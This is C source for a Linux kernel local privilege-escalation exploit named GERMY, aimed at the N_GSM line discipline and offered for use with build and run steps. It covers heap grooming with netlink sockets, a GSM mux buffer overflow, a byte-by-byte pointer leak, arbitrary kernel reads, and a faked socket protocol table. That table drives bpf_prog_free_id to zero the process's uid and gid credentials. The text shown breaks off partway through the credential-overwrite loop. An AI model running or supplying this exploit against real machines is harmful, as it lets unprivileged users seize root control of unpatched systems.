/*                                                                                                                  
           xxxxx                                                                                                    
       xxxxxxxxx                     xxxxx                 xxxxxxxx             xxxxxx      xxxxxx   xxx        xxx 
     xxxxxxxxxxx                  xxxxxxxx             xxxxxx  xxxx           xxxxxxxx    xxxxxxxx   xx          xx 
    xxxxxx                       xxxxx                xxxxx     xxx          xxxx   xxx  xxxx   xx   x           xxx
   xxxxx                      xxxxxx                  xxxx      xxx          xxx     xxxxxx     xx   x            xx
   xxxx                      xxx                     xxxx      xxxx         xxxx     xxxxx      xx   x           xxx
  xxxx                      xxxx       xxxx          xxx     xxxx           xxx       xxx       xx   xx          xxx
  xxx                     xxxx       xxxxx           xxx  xxxxx             xx         xx       xxx  xxxx      xxxx 
  xxx       xxxxxxxxxx    xxx   xxxxxxxxx            xx   xxxx              xxx                 xxx   xxxxxxxxxxxx  
  xxx       xxxxxxxxxx   xxxxxxxxxxx                 xx     xxxxx           xxx                xxxx      xxxx   xx  
  xxxx        xxx        xxxxxx                      xx       xxxx          xxx                 xxx            xx   
  xxxxx       xxx        xxxx                xxxx    xxx         xxx        xxx                              xxx    
   xxxxxxxxxxxxxx        xxxxx            xxxxxxx     xxx         xxxx      xxx                             xx      
     xxxxxxxxxxx         xxxxxxxx    xxxxxxxxxx       xxxx         xxxx                                  xxxx       
        xxxxxxx           xxxxxxxxxxxxxxxx             xxxx                                            xxxx         
                            xxxxxxxxxx                   xx                                        xxxxx            

    OVERVIEW:
        GERMY is an N_GSM Linux kernel privilege escalation exploit for versions 5.15-rc1 to 6.6-rc1

        Tested on:
            - Ubuntu LTS 20.04.6 (5.15.x) and 22.04.4 (6.5.x)
            - Ubuntu non-LTS 23.10 (6.5.x)
            - Debian 12.5 (6.1.x)

    ASSUMPTIONS:
        - target system is x86_64, with 8-byte pointers and 4-byte integers:
            `sizeof(u64) == sizeof(void*) == sizeof(uintptr_t)`
            `sizeof(u32) == 4 == sizeof(i32)`
        - struct randomization is not enabled

    USAGE:
        - make
        - ./germy

    You can run it with `./germy --retry` to continually retry the overflow if the exploit failed, 
    but this may compromise system stability.

    @roddux, 2024-05
*/
#define _GNU_SOURCE        // ptmx stuff
#include <stdio.h>         // printf
#include <stdlib.h>        // exit
#include <string.h>        // strcmp
#include <unistd.h>        // fork, close, get[pt]id, sleep, write
#include <fcntl.h>         // open
#include <sys/ioctl.h>     // ioctl
#include <linux/gsmmux.h>  // gsm tty structs, ioctls
#include <inttypes.h>      // printing u/intN_t types
#include <sys/resource.h>  // raise soft limits
#include <sys/socket.h>    // socket code
#include <linux/netlink.h> // AF_NETLINK, sockaddr_nl
#include <poll.h>          // exploit stuff, used for memleak
#include <termios.h>       // termios stuff, raw mode
#include <sched.h>         // setaffinity for heap grooming
#include <sys/utsname.h>   // kernel version info via uname, for offsets

#include "offsets.h"       // generated offset tables, and i32/u32 types

#define SYS(X) do {                                                                                  \
    i64 r=X;                                                                                         \
    if (r<0) {                                                                                       \
        LOG("\n\n[!] %s in %s, line %d: %s returns %"PRId64"\n",__FILE__,__func__,__LINE__,#X,r); \
        exit((int)r);                                                                                \
    }                                                                                                \
} while(0)

#ifdef DEBUG
#define DBGLOG(...) printf(__VA_ARGS__)
#else
#define DBGLOG(...) {}
#endif

#define LOG(...) printf(__VA_ARGS__)

u16 WRITE_DELAY = 1500;    // wait this long for writes to go through. not const; we may increase it
#define ASYNC_DELAY 3500   // wait this long for async task to free sockets
#define MAX_FD_LIMIT 16384 // don't open more than this number of sockets

#define GSM_WRITE(fd,src,srclen) do {  \
    SYS(write(fd, src, srclen));       \
    usleep(WRITE_DELAY);               \
} while(0)

// these are not always picked up by my compiler, so we define them here
#define GSMIOC_GETCONF_DLCI _IOWR('G', 7, struct gsm_dlci_config)
#define GSMIOC_SETCONF_DLCI _IOW ('G', 8, struct gsm_dlci_config)
#define GSM0_SOF 0xF9
#define GSM1_SOF 0x7E
#define EA       0x01
#define MUX_BASIC 0
#define MUX_ADV   1
const int gsm_ldisc  = 21; // N_GSM0710 == 21
const int ntty_ldisc = 0;  // N_TTY     == 0


// set GSM config to change the mux mode
void set_gsm_config(int dev_fd, int mux, int do_log) {
    struct gsm_config c = {0};
    c.adaption = 1;  // 1 or 2
    c.mru = 128;     // 8-1500
    c.mtu = 128;     // 8-1500 -- we want <1024, see exploitation notes on lines 222-226
    c.i = 1;         // 1 or 2

    if (mux == MUX_BASIC) {
        c.encapsulation = MUX_BASIC; // 0 == basic == gsm0_receive
        if(do_log) DBGLOG("[+] Setting basic mux mode\n");
    } else {
        c.encapsulation = MUX_ADV; // 1 == advanced == gsm1_receive
        if(do_log) DBGLOG("[+] Setting advanced mux mode\n");
    }

    // set the configuration to tty fd
    SYS(ioctl(dev_fd, GSMIOC_SETCONF, &c));
}

// open ourselves a new tty from multiplexer
void open_ptmx(int *master, int *slave) {
    DBGLOG("[+] Opening ptmx\n");
    int dev_fd = open("/dev/ptmx", O_RDWR);
    SYS(dev_fd);

    SYS(grantpt(dev_fd));

	SYS(unlockpt(dev_fd));

    // get the new slave terminal name
	char *pts = ptsname(dev_fd);
	if(pts == NULL) SYS(-1);

    // open the new slave tty
	int slave_fd = open(pts, O_RDWR);
    SYS(slave_fd);

    *master = dev_fd;
    *slave = slave_fd;
}

// set the GSM line discipline on given tty fd
void set_tty_ldisc(int dev_fd, const int *ldisc) {
    DBGLOG("[+] Setting GSM line discipline\n");
    SYS(ioctl(dev_fd, TIOCSETD, ldisc));
}

// we need to open a lot of sockets, so bump our socket limits to the hardlimit
void raise_ulimits(u64 *max_fds) {
    struct rlimit limits;
    DBGLOG("[+] Raising soft file limits\n");

    // get the file limits
    SYS(getrlimit(RLIMIT_NOFILE, &limits));

    // bump soft limit to max, if it's not max already
    if (limits.rlim_cur != limits.rlim_max) {
        limits.rlim_cur = limits.rlim_max;

        // set the higher limits
        SYS(setrlimit(RLIMIT_NOFILE, &limits));
    }

    // keep track of the max
   *max_fds = limits.rlim_max;
}

// stuff the kmalloc-2k cache with netlink socket objects. update the max_permitted counter with the
// number of sockets we were actually able to allocate
int* fill_2k_cache(u64 *max_permitted) {
    u64 num = *max_permitted;
    int *sockets = malloc(sizeof(int) * num);
    for(u64 i=0;i<num;i++) sockets[i] = -1;

    for(u64 i = 0; i < num; i++) {
        sockets[i] = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_GENERIC);
        if (sockets[i] < 0) {
            // LOG("[!] Only allocated %lu sockets! User limits?\n", i-1);
            *max_permitted = i-1;
            break;
        }
    }
    return sockets;
}

// set a tty to raw mode; no input escaping
void raw_mode(int dev_fd) {
    DBGLOG("[+] Removing all termios settings for tty %d\n", dev_fd);
    struct termios term = {0};

    cfmakeraw(&term);
    SYS(tcsetattr(dev_fd, TCSANOW, &term));
}

// set affinity, as caches are per-cpu
void set_affinity(u64 cpu) {
    DBGLOG("[+] Setting affinity to cpu %"PRIu64"\n", cpu);
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    SYS(sched_setaffinity(getpid(), sizeof(set), &set));
}

// the bytes that will be written to the base of gsm.mux buffer to break the length accounting
u8 junk_base[] = {0xde,0xad,0xbe,0xef,0xca,0xfe,0xba,0xbe,0xf0,0x0d,0xfe,0xed,0x41,0x41,0x41,0x41};
#define clash_len sizeof(junk_base)

// reset the overflow for a mux. after this, gsm.count==16 && gsm.buf[0:16] == junk_base
void gsm_reset(int master_fd, int slave_fd) {
    // get back into advanced mode
    set_gsm_config(slave_fd, MUX_ADV, 0);

    // send one byte to trigger transition to GSM_OVERRUN state, and a GSM1_SOF to trigger 
    // transition to GSM_START. we are now in GSM_START state, in advanced/gsm1 mux mode. 
    // send one more byte to get to GSM_ADDRESS.
    u8 rst[3] = {
        0,         // trigger state switch to GSM_OVERRUN
        GSM1_SOF,  // trigger state switch to GSM_START
        0          // trigger state switch to GSM_ADDRESS
    };
    GSM_WRITE(master_fd, &rst, sizeof(rst));
    
    // switch back to basic mux mode and continue redo the overflow
    set_gsm_config(slave_fd, MUX_BASIC, 0);
    
    // note: we set gsm.mru to 128 earlier.
    // we are now in state GSM_ADDRESS in the basic/gsm0 mux mode. send 1 byte to set the address and
    // move to GSM_LEN0. when we send another byte so the `gsm->len > gsm->mru` check will fail. this
    // is because gsm.len is shifted on the line before in gsm_read_ea, so is now above 128.
    // 8 << 7 == 1024 -- if gsm.mru is less than 1024, we cleanly restart the state machine.

    u8 rst_and_ctrl[] = {
        0|EA,     // trigger state switch to GSM_CONTROL
        1,        // trigger state switch to GSM_LEN0
        1,        // trigger state switch to GSM_SEARCH by failing gsm.len > gsm.mru check
        GSM0_SOF, // start byte, GSM_SEARCH to GSM_ADDRESS
        (0 | EA), // zero addr,  GSM_ADDRESS to GSM_CONTROL
        7,        // control byte, GSM_CONTROL to GSM_LEN0
        (16 | EA),// GSM_LEN0 to GSM_DATA
    };
    // push state machine back around into DATA with gsm.count as 0
    GSM_WRITE(master_fd, &rst_and_ctrl, sizeof(rst_and_ctrl));

    // set advanced mux mode to enter state machine 1
    set_gsm_config(slave_fd, MUX_ADV, 0);

    // write clash_len(16) bytes in mux mode 1 to set gsm.count to 16
    GSM_WRITE(master_fd, &junk_base, clash_len);

    // switch mode back to basic, bypassing the buffer length check
    // gsm.count is now 16, gsm.len is 8
    // if (gsm.count == gsm.len)
    set_gsm_config(slave_fd, MUX_BASIC, 0);
}

// return an offset table, based on a tag made from uname's release and version strings
i32 kernel_offset_info() {
    struct utsname sysinfo;
    SYS(uname(&sysinfo));
    char kernel_tag[sizeof(((struct kernel_offsets*)0)->kernel_tag)];

    // we use utsname.version to handle Ubuntu HWE/LTS kernels, as they use the same version number
    // as regular kernels, but have different offsets.

    // turn: '6.5.0-28-generic #29~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Thu Apr  4 14:39:20 UTC 2'
    // into: '6.5.0-28-generic#29~22.04.1-Ubuntu'
    snprintf(kernel_tag, sizeof(kernel_tag), "%s%s", sysinfo.release, sysinfo.version);
    char *delim = " ";
    char *ver = strdup(kernel_tag);
    char *space = strtok(ver, delim);

    i32 ret = -1;
    for(u32 i = 0; i < NUM_KERNELS; i++) {
        if(strcmp(offset_table[i].kernel_tag, ver) == 0) {
            LOG("[+] Got offsets for '%s'\n", ver);
            ret = i;
            goto out;
        }
    }
    LOG("[!] Offsets not found for current kernel release %s\n", sysinfo.release);
out:
    free(ver);
    return ret;
}

// read 8 bytes from an arbitrary address
u64 read_u64(ptr address, int corrupted, int master_fd, int slave_fd) {
    u8 zero_fill[2048] = {0};
    u32 bucket_len = KMALLOC_2K - clash_len;

    gsm_reset(master_fd, slave_fd); // reset the overflow
    GSM_WRITE(master_fd, &zero_fill, bucket_len); // fill up gsm.buf

    struct __attribute__((packed)) net_overwrite {
        u8 pad[SKC_NET_OFFSET]; // as skc_net is at a consistent location, we can #define it and use
        u8 *ptr;                // a struct, instead of using malloc and offsets
    } net_overwrite = {0};

    // offset the address we want to read by the offset of net_cookie inside struct net
    net_overwrite.ptr = (void*)address;
    GSM_WRITE(master_fd, &net_overwrite, sizeof(net_overwrite));

    // now call getsockopt(SO_NETNS_COOKIE) to read sk.skc_net->net_cookie
    ptr ptr_leak;
    u32 ptr_sz = sizeof(ptr_leak);

    // a delay should not be required, but it can help with reliability
    usleep(20000);

    u8 count = 0;
    do {
        // the overwrite can take a while to land, so we just retry
        SYS(getsockopt(corrupted, SOL_SOCKET, SO_NETNS_COOKIE, &ptr_leak, &ptr_sz));
    } while(count++ < 20);

    return ptr_leak;
}

// where the magic happens
int main(int argc, char *argv[]) {
    u8 retry_on_fail = 0; // don't retry on failure, as it may worsen system stability

    if(argc == 2) {
        if (strcmp(argv[1],"--retry") == 0) {
            retry_on_fail = 1;
        }
    }
    LOG("[+] Will%sretry on failure\n", retry_on_fail?" ":" not ");

    int offset_idx = kernel_offset_info();
    if(offset_idx<0) {
        LOG("[+] No offsets found for this kernel\n");
        SYS(offset_idx);
    }
    struct kernel_offsets *offsets;
    offsets = &offset_table[offset_idx];

    // bind to one core; we need to hit per-core caches. we use core 1, as 0 may be busy
    set_affinity(1);

    // determine the max number of FDs we can open, raising the softlimit if we can
    u64 max_fds = 0;
    raise_ulimits(&max_fds);
    if(max_fds > MAX_FD_LIMIT) max_fds=MAX_FD_LIMIT;

    // close every N sockets to try and land in the allocation hole. on retry, we will adjust this
    // skip and close more sockets.
    u8 close_skip = 14;

    // file descriptors for master/slave ttys
    int master_fd, slave_fd;

    // grab a new tty from ptmx
    open_ptmx(&master_fd, &slave_fd);

    // disable echoing and escaping for the new tty
    raw_mode(master_fd);

retry_exploit:
    // flush some caches
    #define FLUSH_COUNT 16
    for(int i = 0; i < FLUSH_COUNT; i++) {
        DBGLOG("\r[+] Flushing kmalloc-2k caches, iter %d/%d  ", i+1, FLUSH_COUNT);
        fflush(stdout);
        int *sockets = fill_2k_cache(&max_fds);
        for(u64 j = 0; j < max_fds; j++) close(sockets[j]);
        free(sockets);
    } DBGLOG("\n");

    // fill the kmalloc-2k cache with netlink sockets. we're using netlink sockets because they
    // happily fit in kmalloc-2k, using the same malloc flags as gsm_mux - and they have a few
    // nice function pointers/etc.
    DBGLOG("[+] Attempting to allocate %lu netlink sockets in kmalloc-2k cache\n", max_fds);
    int *sockets = fill_2k_cache(&max_fds);

    // close a bunch of netlink sockets in reverse order to make holes in the kmalloc-2k cache
    DBGLOG("[+] Closing some sockets to create holes in kmalloc-2k list\n");
    for(i64 i=max_fds-1; i>=0; i-=close_skip) {
        close(sockets[i]);
        sockets[i] = -1;
    }

    // small delay, to allow some frees() to happen in the async task
    DBGLOG("[+] Waiting %dus for async free\n", ASYNC_DELAY);
    usleep(ASYNC_DELAY);

    #ifndef DEBUG
    LOG("[+] Attempting exploit ...\n");
    #endif

    // spawn a new gsm mux. we need gsm.buf to fill one of the holes we made in the kamlloc-2k cache
    // next to a netlink socket. this is the risky part.
    set_tty_ldisc(slave_fd, &gsm_ldisc);

    // hopefully our allocation landed correctly.

    // set basic mux to enter state machine 0
    set_gsm_config(slave_fd, MUX_BASIC, 1);

    // write out a packet to the tty
    DBGLOG("[+] Writing start of control packet to the mux\n");
    u8 ctrl[] = {
        GSM0_SOF,   // start packet: GSM_SEARCH  to GSM_ADDRESS
        (0 | EA),   // dlci 0:       GSM_ADDRESS to GSM_CONTROL
        7,          // random        GSM_CONTROL to GSM_LEN0
        (16 | EA),  // length|EA     GSM_LEN0    to GSM_DATA
    };
    GSM_WRITE(master_fd, &ctrl, sizeof(ctrl));

    // set advanced mux mode to enter state machine 1
    set_gsm_config(slave_fd, MUX_ADV, 1);

    // we set gsm.len to 8 earlier; 16|EA >>= 1 == 8 -- so any length above 8 will work
    // here we push gsm.count above gsm.len by sending more than 8 bytes: gsm.buf[gsm.count++]
    DBGLOG("[+] Writing %lu bytes to break length accounting\n", clash_len);
    GSM_WRITE(master_fd, &junk_base, clash_len);

    // switch mode back to basic, bypassing the buffer length check: gsm.count == gsm.len
    set_gsm_config(slave_fd, MUX_BASIC, 1);

    // fill the rest of the kmalloc-2k bucket with zeroes
    u32 bucket_len = KMALLOC_2K - clash_len;
    DBGLOG("[+] Writing %u zeroes to fill gsm.buf's kmalloc-2k bucket\n", bucket_len);
    u8 zero_fill[KMALLOC_2K] = {0};
    GSM_WRITE(master_fd, &zero_fill, bucket_len);

    // here is where we do our first overwrite into a neighbouring kmalloc-2k bucket. hopefully this
    // is writing into one of our netlink sockets we allocated above
    u32 skc_family_overwrite_len = (sizeof(u8) * SKC_FAMILY_OFFSET) + sizeof(u16);
    u8 *skc_family_overwrite_buffer = malloc(skc_family_overwrite_len);
    u16 *family = (void*)(skc_family_overwrite_buffer+SKC_FAMILY_OFFSET);
    *family = 1337;
    DBGLOG("[+] Writing 1337 to skc_family field (hopefully)\n");
    GSM_WRITE(master_fd, skc_family_overwrite_buffer, skc_family_overwrite_len);
    free(skc_family_overwrite_buffer);

    // check if our corruption landed. we're using skc_family as an indicator, because it's the 
    // closest thing to the top of struct sock that i could find a syscall to check the value for;
    // see getsockopt below.
    DBGLOG("[+] Checking sockets to see if our overflow landed\n");
    int corrupted = -1;
    for(u64 i=0; i<max_fds; i++) {
        int s = sockets[i];
        if (s <= 0) continue;

        // getsockopt(SOL_SOCKET, SO_DOMAIN) checks sk->skc_family directly, which is what we
        // hopefully wrote to. so, any socket that doesn't return AF_NETLINK is the corrupted socket
        int data = -1;
        u32 datalen = sizeof(data);
        int ret = getsockopt(s, SOL_SOCKET, SO_DOMAIN, &data, &datalen);
        if (ret == 0 && data != AF_NETLINK) {
            DBGLOG("[+] Overflow landed, socket %d gives %d for getsockopt(SO_DOMAIN)\n", s, data);
            #ifndef DEBUG
            LOG("[+] Exploit landed\n");
            #endif
            corrupted = s;
            break;
        }
    }

    // we didn't find the corrupted socket, which means we may have overwritten something important
    if(corrupted == -1) {
        if(retry_on_fail == 0) {
            LOG("[!] Exploit failed! We corrupted something wrong; system may become unstable\n");
            SYS(corrupted);
        }
        LOG("[!] Exploit failed, retrying... system may become unstable\n");

        // close all open sockets
        for(u64 i=0;i<max_fds;i++) if(sockets[i] > 0) close(sockets[i]);
        free(sockets);

        // reset tty line discipline back to normal
        set_tty_ldisc(slave_fd, &ntty_ldisc);

        // adjust our offset that we're closing files, maybe slab freelist randomisation broke us
        close_skip -= 1;
        if(close_skip == 2) close_skip = 14;

        goto retry_exploit;
    }
    
    // our allocation landed! cleanup waste
    DBGLOG("[+] Closing unneeded sockets\n");
    for(u64 i = 0; i < max_fds; i++) {
        int s = sockets[i];
        if(s < 0 || s == corrupted) continue;
        close(s);
    } free(sockets);


    /*
    now we will do an infoleak. we can call .poll on the corrupted socket to call into 
    skb_queue_empty_lockless:
    
        skb_queue_empty_lockless(const struct sk_buff_head *list) {
            return READ_ONCE(list->next) == (const struct sk_buff *) list;
        }

    calling poll normally will return TRUE for the above, signalling that the error queue is empty,
    so poll will not return the EPOLLERR flag. if we corrupt the first byte of sk_buff_head, we will
    change the first byte of list->next. This causes the condition to return FALSE, which causes 
    poll to return the EPOLLERR flag.

    we can use this to guess the address of sk_buff_head incrementally, by overwriting a byte at a
    time and checking EPOLLERR on every change.
    */

    #ifndef DEBUG
    LOG("[+] Attempting infoleak ...\n");
    #endif

    // but first, we sanity check to make sure that poll is not returning errors (yet)
    DBGLOG("[+] Checking that poll(fd) on our corrupted socket returns no errors\n");
    struct pollfd pfd = {0};
    pfd.fd = corrupted;
    SYS(poll(&pfd,1,1));
    if(pfd.revents & POLLERR) {
        DBGLOG("[!] Calling poll on our corrupted socket returns EPOLLERR!?\n");
        SYS(-1);
    }


    /*
    okay. because we know sk_error_queue is an offset in an allocation made to a 2k bucket, we can 
    eliminate some guesses we need to make. we know some (likely) offsets for a few bytes, reducing
    our guessing time.
    
    i.e., if sk_error_queue is at offset 192/0xc0 inside the struct, that's our first byte.
    similarly, the whole buffer must be 2048-aligned, which limits options for the second byte, etc.
    */
    u32 sk_error_queue_offset = offsets->SK_ERROR_QUEUE;
    u32 guess_byte_offset = sk_error_queue_offset;
    u8 guess_byte = 0x00;
    u8 sk_error_queue_ptr[] = {
        (u8)sk_error_queue_offset,

              // pos1 must cleanly divide by 2048, so we can limit the number of possibilities 
        0,    // down to 32 options from 256. see pos1_bytes below

        0,    // any
        0,    // any
        0,    // any
        0,    // any
        0xff, // good enough of a guess
        0xff  //
    };
    u32 ptr_guess_idx = 0;
    u8 assumed_guess = 0;
    u8 pos1_guesses = 0;
    u8 pos1_bytes[] = {
        0x00, 0x08, 0x10, 0x18, 0x20, 0x28, 0x30, 0x38,
        0x40, 0x48, 0x50, 0x58, 0x60, 0x68, 0x70, 0x78,
        0x80, 0x88, 0x90, 0x98, 0xa0, 0xa8, 0xb0, 0xb8, 
        0xc0, 0xc8, 0xd0, 0xd8, 0xe0, 0xe8, 0xf0, 0xf8
    };
    // this is what we write to the socket to guess the ptr, we set buf[X] to the guess
    u8 zero_overwrite_buf[4096] = {0};
    do {
        // reset gsm overflow
        gsm_reset(master_fd, slave_fd);

        // make specific guesses for known offsets
        if (sk_error_queue_ptr[ptr_guess_idx]) {
            guess_byte = sk_error_queue_ptr[ptr_guess_idx];
            assumed_guess=1;
        }

        // special handling for pos1
        if(ptr_guess_idx == 1) {
            if(pos1_guesses == sizeof(pos1_bytes)) {
                // if we're here, the netlink socket allocation isn't on a 2k-aligned page. weird!
                // has the exploit has failed in an unexpected way..? bail out
                DBGLOG("\n\n[!] We failed to figure out byte1, somehow it's not divisible by 2048..?");
                SYS(-1);
                // or; we are guessing too quickly, and the write didn't flush through yet. we don't
                // handle this, though
            } else {
                guess_byte = pos1_bytes[pos1_guesses++];
            }
        }

        // currently guessing byte N of the pointer
        ptr_guess_idx = (guess_byte_offset-sk_error_queue_offset);
        DBGLOG("\r[+] Guessing %02x for sk_error_queue address pointer for byte %d/7 ... ", guess_byte, ptr_guess_idx);
        fflush(stdout);

        // fill the kmalloc-2k bucket and enough into the following netlink_sock to reach the byte 
        // we're currently guessing
        u64 offset = KMALLOC_2K - clash_len + guess_byte_offset;
        GSM_WRITE(master_fd, &zero_overwrite_buf, offset);
        GSM_WRITE(master_fd, &guess_byte, 1);

        // check for EPOLLERR
        pfd.revents = 0;
        SYS(poll(&pfd,1,1));

        // if no EPOLLERR, the byte is correct
        if(! (pfd.revents & POLLERR) ) {
            DBGLOG("yes! ptr[%d] == %02x\n", ptr_guess_idx, guess_byte);

            // save the correct byte to our saved pointer
            sk_error_queue_ptr[ptr_guess_idx] = guess_byte;

            // also save correct byte to our overflow buffer, for when we guess the next byte
            zero_overwrite_buf[offset] = guess_byte;

            // check next location
            guess_byte_offset += 1;
            guess_byte = 0x00;

            if (ptr_guess_idx == 7) break;  // break if we have all the bytes

            DBGLOG("[+] Current guess: %p\n", (void*) *(u64*)sk_error_queue_ptr);

            assumed_guess = 0;  // next byte isn't necessarily an assumed guess
            ptr_guess_idx += 1;

            continue;
        }

        guess_byte += 1;  // this guess wasn't correct, try next

        // we guessed a specific byte at a known offset (c0,ff,ff) -- but it was wrong? try again...
        if(assumed_guess) {
            assumed_guess = 0;
            guess_byte = 0x00;
            sk_error_queue_ptr[ptr_guess_idx] = 0;
        }

        // TODO: we could add a check to see if we have gone through all 255 guesses for a specific
        // byte. This can happen if we try the poll() before the gsm_write has flushed through to
        // the socket in an async_task.
        // We could increase WRITE_DELAY and try again: WRITE_DELAY += 50
    } while(1);

    fflush(stdout);

    // leaked pointer
    ptr *ptr64 = (ptr*)&sk_error_queue_ptr;
    ptr netlink_sock_addr = *ptr64;
    DBGLOG("[+] Leaked address of sk_error_queue: %"PRIxPTR"\n", netlink_sock_addr);
    netlink_sock_addr -= sk_error_queue_offset;
    DBGLOG("[+] Address of netlink_sock:          %"PRIxPTR"\n", netlink_sock_addr);
    
    // gsm buffer is 1 kmalloc-2k bucket behind the netlink sock
    ptr gsm_buf_addr = netlink_sock_addr - KMALLOC_2K;
    DBGLOG("[+] Address of gsm.buf:               %"PRIxPTR"\n", gsm_buf_addr);
    
    /*
    now we know the address of the netlink socket, we can use it to get a controlled leak. we can
    overwrite sk.skc_net, and call getsockopt(SO_NETNS_COOKIE) to read sk.skc_net->net_cookie. 
    knowing the offset of net_cookie in struct net, we can now set skc_net to read whatever we want.

    here we will use it to get the address of netlink_proto, so we can calculate the kernel base
    address. see read_u64 function implementation.
    */
    #define READ(ADDR) read_u64(ADDR - offsets->NET_COOKIE, corrupted, master_fd, slave_fd);
    u64 ptr_leak = READ(netlink_sock_addr + offsets->SK_PROT_CREATOR);
    DBGLOG("[+] Leaked netlink_proto address:     %"PRIxPTR"\n", ptr_leak);
    ptr kernel_base = ptr_leak - offsets->NETLINK_PROTO;
    LOG("[+] Kernel base:                      %"PRIxPTR"\n", kernel_base);
 
    // save the pointer to struct net* for later cleanup
    ptr orig_net_ptr = READ(netlink_sock_addr + SKC_NET_OFFSET);
    DBGLOG("[+] Saved sk.skc_net pointer:         %"PRIxPTR"\n", orig_net_ptr);

    // we can get a pointer to current task's cred via sk.socket.file.f_cred, then write to the fields
    ptr sk_socket = READ(netlink_sock_addr + offsets->SK_SOCKET);
    DBGLOG("[+] Leaked sk.sk_socket:              %"PRIxPTR"\n", sk_socket);
    ptr sk_socket_file = READ(sk_socket + offsets->FILE_SK);
    DBGLOG("[+] Leaked sk.sk_socket.file:         %"PRIxPTR"\n", sk_socket_file);
    ptr cred = READ(sk_socket_file + offsets->FCRED_FILE);
    DBGLOG("[+] Leaked sk.sk_socket.file.f_cred:  %"PRIxPTR"\n", cred);

    /*
    exploit stage

    we will overwrite sk.__sk_common.skc_prot with a pointer to a fake proto object. using this, we
    can call setsockopt(SO_KEEPALIVE) to directly call a function pointer on sk_proto. so, we setup
    the fake proto object with keepalive pointing where we want it.

    the target function (keepalive) is called with sk as it's first argument. we will call 
    bpf_prog_free_id, and use a crafted sock object to set cred fields to zero directly:

        void bpf_prog_free_id(struct bpf_prog *prog) {
            unsigned long flags;
            if (!prog->aux->id)
                return;

            spin_lock_irqsave(&prog_idr_lock, flags);
            idr_remove(&prog_idr, prog->aux->id);
            prog->aux->id = 0; // <-- id == ptr to cred object, with offset to uid/gid fields
            spin_unlock_irqrestore(&prog_idr_lock, flags);
        }

    */



    // some kernels have different size/count of the fields before the string of uid/gid fields.
    // we grab the offset for the first field, then assume everything else is still in order
    struct cred_fields {
        char* fname;
        u32 off;
    } fields[] = {
        {  "uid",  offsets->CRED_UID +  0},
        {  "gid",  offsets->CRED_UID +  4},
        { "suid",  offsets->CRED_UID +  8},
        { "sgid",  offsets->CRED_UID + 12},
        { "euid",  offsets->CRED_UID + 16},
        { "egid",  offsets->CRED_UID + 20},
        {"fsuid",  offsets->CRED_UID + 24},
        {"fsgid",  offsets->CRED_UID + 28}
    };
    #define FIELDS sizeof(fields)/sizeof(struct cred_fields)

    #ifdef DEBUG
    // show the cred fields before overwrite
    // this is not required, and can be removed without issue.
    for(u8 cur_field = 0; cur_field < FIELDS; cur_field++) {
        u32 cred_leak = READ(cred + fields[cur_field].off);
        LOG("[+] current_cred()->%s: %d\n", fields[cur_field].fname, cred_leak);
    }
    #endif

    u64 bpf_writer_ptr = kernel_base+offsets->BPF_WRITER;
    DBGLOG("[+] Address of writer function:       %"PRIxPTR"\n", bpf_writer_ptr);

    struct __attribute__((packed)) proto {
        u64 *funcptrs[16]; // proto isn't 16 entries, but we don't need to set that many
    } fake_proto = {0};
    fake_proto.funcptrs[10] = (void*)bpf_writer_ptr; // keepalive is offset 12 or something, but
    fake_proto.funcptrs[11] = (void*)bpf_writer_ptr; // some kernel versions have +/- a couple of
    fake_proto.funcptrs[12] = (void*)bpf_writer_ptr; // funcptrs, so we just set these 4 to be
    fake_proto.funcptrs[13] = (void*)bpf_writer_ptr; // safer

    // prog aux wants to point to cred - offset_to_aux_id_field(32) + offset_to_cred_field_to_ovw(uid,4)
    // overwrite buffer for the socket
    #define max(x,y) (x>y?x:y)
    u32 ovw_sz = max(SKC_PROT_OFFSET+8, offsets->AUX_IN_BPF+8) * sizeof(u8);
    u8 *ovw_buf = malloc(ovw_sz);
    u64 *aux_ptr = (void*)(ovw_buf + offsets->AUX_IN_BPF);
    u64 *sk_prot = (void*)(ovw_buf + SKC_PROT_OFFSET);

    #ifndef DEBUG
    LOG("[+] Overwriting credentials ...\n");
    #endif
    for(u8 cur_field = 0; cur_field < FIELDS; cur_field++) {
        gsm_reset(master_fd, slave_fd);

        // we write our fake proto object into gsm.buf, so it's not in the way
        GSM_WRITE(master_fd, &fake_proto, sizeof(fake_proto));

        // now with our fake objects in place we write to the end of the bucket, then overwrite sk_prot
        u32 zero_len = KMALLOC_2K - (clash_len + sizeof(fake_proto));
        GSM_WRITE(master_fd, zero_fill, zero_len);

        /*
        bpf_prog_free_id is usable from 4.16-rc1

            void bpf_prog_free_id(struct bpf_prog *prog) {
                unsigned long flags;
                if (!prog->aux->id)
                    return;

                spin_lock_irqsave(&prog_idr_lock, flags);
                idr_remove(&prog_idr, prog->aux->id); // (hopefully) noop! :)
                prog->aux->id = 0;
                spin_unlock_irqrestore(&prog_idr_lock, flags);
            }
        
        */
        // sk overlaps bpf_prog
        // sk + 56 needs to be ptr to bpf_prog_aux *aux, pointing at our credential object
        // offset aux so it points to current_cred()->{field} 
        *aux_ptr = cred - offsets->ID_IN_AUX + fields[cur_field].off;

        // set sk_proto pointer
        *sk_prot = gsm_buf_addr + clash_len;

        // overwrite the socket
        GSM_WRITE(master_fd, ovw_buf, ovw_sz);

        // we need to setup a fake socket_lock structure, so we don't spinlock when lock/releas-ing
        // our corrupted socket. sk_lock is always, in kernels we care about, after sk_prot
        struct __attribute__((packed)) socket_lock_t {
            int slock;
            int owned;
            struct wq_head {
                int lock;
                struct list_head {
                    u64 *head;
                    u64 *next;
                } lh;
            } wqh;
        } fake_slock = {0};
        fake_slock.wqh.lh.head = (void*)(
            netlink_sock_addr                                // base address
            + offsets->SK_LOCK                               // to the socket_lock
            + __builtin_offsetof(struct socket_lock_t, wqh)  // then to list_head in wq_head
            + __builtin_offsetof(struct wq_head, lh));       // offset to first memeber of list_head
        fake_slock.wqh.lh.next = (void*)(
            netlink_sock_addr                                // base address
            + offsets->SK_LOCK                               // to the socket_lock
            + __builtin_offsetof(struct socket_lock_t, wqh)  // then to list_head in wq_head
            + __builtin_offsetof(struct wq_head, lh));       // offset to first memeber of list_head

        u32 offset_to_sk_lock = offsets->SK_LOCK - ovw_sz;
        GSM_WRITE(master_fd, zero_fill, offset_to_sk_lock);
        GSM_WRITE(master_fd, &fake_slock, sizeof(fake_slock));

        DBGLOG("[+] Overwriting current_cred()->%s\n", fields[cur_field].fname);
        u64 a = 0;
        u32 b = sizeof(u64);
